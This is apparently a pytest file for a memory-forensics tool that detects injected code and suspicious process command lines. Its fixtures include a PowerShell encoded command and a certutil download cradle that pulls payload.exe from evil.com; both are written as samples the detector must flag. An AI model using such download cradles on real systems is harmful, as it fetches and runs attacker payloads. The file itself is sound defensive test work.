import os
import sys
import tempfile
import pytest
from datetime import datetime, timezone

from fmd.v2.domain.contracts import (
    ProviderCapability, CapabilityStatus, TriState, ProviderId
)
from fmd.v2.domain.evidence.provenance import ProvenanceRecord
from fmd.v2.adapters.providers.volatility.dtos import (
    ProcessDTO, InjectedCodeDTO
)
from fmd.v2.adapters.providers.injected_code_detector import InjectedCodeDetector
from fmd.v2.adapters.providers.process_tree_detector import ProcessTreeAnomalyDetector
from fmd.v2.adapters.providers.volatility.collector import VolatilityCollector
from fmd.v2.domain.evidence.ledger import EvidenceLedger
from fmd.v2.domain.evidence.mapper import EvidenceMapper
from fmd.v2.adapters.cli.compy_cli import build_v2_app, run_analysis_pipeline


def test_injected_code_detector_identifies_pe_header_and_rwx():
    """
    Validates InjectedCodeDetector detects injected PE headers (MZ) and RWX unbacked allocations.
    """
    ledger = EvidenceLedger()
    mapper = EvidenceMapper(ledger)
    prov = ProvenanceRecord(
        _provider_id=ProviderId("volatility3_malfind"),
        _artifact_identity="test_image_hash",
        _acquisition_mode="VOLATILITY3_TEST",
        acquisition_time=datetime.now(timezone.utc)
    )

    # Ingest injected code findings
    injected_dto_1 = InjectedCodeDTO(
        pid=1337,
        process_name="svchost.exe",
        start_vpn=0x00400000,
        end_vpn=0x00410000,
        protection="PAGE_EXECUTE_READWRITE",
        commit_charge=16,
        tag="VadS",
        hexdump_preview="4d 5a 90 00 03 00 00 00 MZ......",
        disasm_preview="dec eax ; pop edx"
    )
    injected_dto_2 = InjectedCodeDTO(
        pid=2048,
        process_name="explorer.exe",
        start_vpn=0x02a00000,
        end_vpn=0x02a05000,
        protection="PAGE_EXECUTE_READ",
        commit_charge=5,
        tag="Vad ",
        hexdump_preview="90 90 90 90 90 cc cc cc ........",
        disasm_preview="nop ; nop ; nop"
    )

    mapper.ingest_injected_code(
        [injected_dto_1, injected_dto_2],
        prov,
        available_capabilities={ProviderCapability.INJECTED_CODE}
    )

    detector = InjectedCodeDetector()
    assert detector.required_capabilities() == {ProviderCapability.INJECTED_CODE}
    assert detector.provider_id() == "injected_code_malfind_v1"

    result = detector.evaluate(ledger, ledger, None)
    assert result.status == CapabilityStatus.SUCCESS
    assert len(result.observations) == 2

    # Verify findings details
    obs_pids = {obs.process_pid for obs in result.observations}
    assert obs_pids == {1337, 2048}

    pe_obs = next(o for o in result.observations if o.process_pid == 1337)
    assert pe_obs.start_address == 0x00400000
    assert pe_obs.protection == "PAGE_EXECUTE_READWRITE"
    assert "PE header" in pe_obs.description or "MZ" in pe_obs.description
    assert pe_obs.confidence == 0.95


def test_process_tree_anomaly_detector_catches_suspicious_cmdlines():
    """
    Validates ProcessTreeAnomalyDetector flags encoded and download cradle commands.
    """
    ledger = EvidenceLedger()
    mapper = EvidenceMapper(ledger)
    prov = ProvenanceRecord(
        _provider_id=ProviderId("volatility3_pslist_cmdline"),
        _artifact_identity="test_image_hash",
        _acquisition_mode="VOLATILITY3_TEST",
        acquisition_time=datetime.now(timezone.utc)
    )

    # Ingest processes with suspicious command lines
    p1 = ProcessDTO(
        pid=1000,
        ppid=4,
        image_file_name="powershell.exe",
        offset=0x1000,
        cmdline="powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="
    )
    p2 = ProcessDTO(
        pid=1004,
        ppid=1000,
        image_file_name="cmd.exe",
        offset=0x2000,
        cmdline='cmd.exe /c certutil.exe -urlcache -split -f "http://evil.com/payload.exe" payload.exe'
    )
    p3 = ProcessDTO(
        pid=2000,
        ppid=500,
        image_file_name="notepad.exe",
        offset=0x3000,
        cmdline="notepad.exe C:\\Users\\Alice\\Documents\\notes.txt"
    )

    mapper.ingest_process_list(
        [p1, p2, p3],
        prov,
        available_capabilities={ProviderCapability.PROCESS_LIST, ProviderCapability.COMMAND_LINE}
    )

    detector = ProcessTreeAnomalyDetector()
    result = detector.evaluate(ledger, ledger, None)
    assert result.status == CapabilityStatus.SUCCESS

    # Should flag powershell encoded command and certutil download cradle
    flagged_pids = [obs.process_pid for obs in result.observations if getattr(obs, "anomaly_category", "") == "SUSPICIOUS_COMMAND_LINE"]
    assert 1000 in flagged_pids
    assert 1004 in flagged_pids
    assert 2000 not in flagged_pids


def test_volatility_collector_enforces_offline_symbol_policy():
    """
    Validates that VolatilityCollector enforces local-only symbol resolution and does not hit the internet.
    """
    collector = VolatilityCollector(memory_image_path="test_mem.raw", artifact_hash="dummy_hash_123")
    assert hasattr(collector, "enforce_offline_symbol_policy")
    assert collector.provider_id() == ProviderId("volatility3-v2.28.2")
    # Verify extraction declares provenance properly
    res = collector.extract_evidence()
    assert res.provenance.artifact_identity == "dummy_hash_123"


def test_cli_execution_with_demo_mode(tmp_path):
    """
    Validates the CLI entrypoint running with --demo produces output reports.
    """
    pdf_out = str(tmp_path / "compy_demo_report.pdf")
    html_out = str(tmp_path / "compy_demo_report.html")
    json_out = str(tmp_path / "compy_demo_report.json")

    rc = run_analysis_pipeline(
        image_path=None,
        demo_mode=True,
        output_pdf=pdf_out,
        output_html=html_out,
        output_json=json_out,
        quiet=True
    )

    assert rc == 0
    assert os.path.exists(pdf_out)
    assert os.path.exists(html_out)
    assert os.path.exists(json_out)
    assert os.path.getsize(pdf_out) > 0
    assert os.path.getsize(html_out) > 0
    assert os.path.getsize(json_out) > 0


def test_cli_execution_with_invalid_image():
    """
    Validates that passing a non-existent or unsupported image returns non-zero error.
    """
    rc = run_analysis_pipeline(
        image_path="C:\\non_existent_image_path.xyz",
        demo_mode=False,
        output_pdf=None,
        output_html=None,
        output_json=None,
        quiet=True
    )
    assert rc != 0
